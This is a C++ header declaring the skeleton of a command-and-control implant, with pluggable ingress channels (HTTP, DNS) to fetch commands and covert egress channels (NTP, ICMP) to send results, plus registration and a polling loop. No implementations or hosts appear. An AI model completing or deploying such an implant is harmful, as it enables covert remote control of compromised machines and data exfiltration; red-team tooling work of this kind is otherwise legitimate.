#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>

// Assuming nlohmann/json is available via msgpack.h or directly
#include "../data/msgpack/msgpack.h" 
// #include <nlohmann/json.hpp> 

// --- Signatures ---
// Ingress: Returns a JSON object (command + metadata), takes current UUID
using IngressFunc = nlohmann::json(*)(std::string implant_uuid);

// Output: Takes the result string and sends it away
using EgressFunc = void (*)(std::string implant_uuid, std::string text_data, std::string task_uuid);

// --- Settings Enums ---
enum class InMethod {
    HTTP,
    DNS,
    // Add others via Jinja
};

enum class OutMethod {
    NTP,
    ICMP,
    // Add others via Jinja
};

// --- The Dispatcher Class ---
class C2Implant {
public:
    // --- Static Storage for Strategies ---
    // Shared by all instances of the implant
    static std::map<InMethod, IngressFunc> ingress_map_;
    static std::map<OutMethod, EgressFunc> egress_map_;

    // --- Resolvers (Optional: String -> Enum) ---
    static std::map<std::string, InMethod>  in_resolver_;
    static std::map<std::string, OutMethod> out_resolver_;

    // --- Instance Data ---
    // Specific to this running agent
    std::string implant_uuid_;

    // --- Lifecycle Methods ---

    // 1. Wires up the map (Jinja target)
    static void init();

    // 2. Registers with C2 to get UUID
    //    Returns 1 on success, -1 on fail
    int register_implant(InMethod registration_method);

    // 3. The Main Loop Step
    //    Uses instance UUID to fetch specific commands
    void cycle(InMethod get, OutMethod post);
};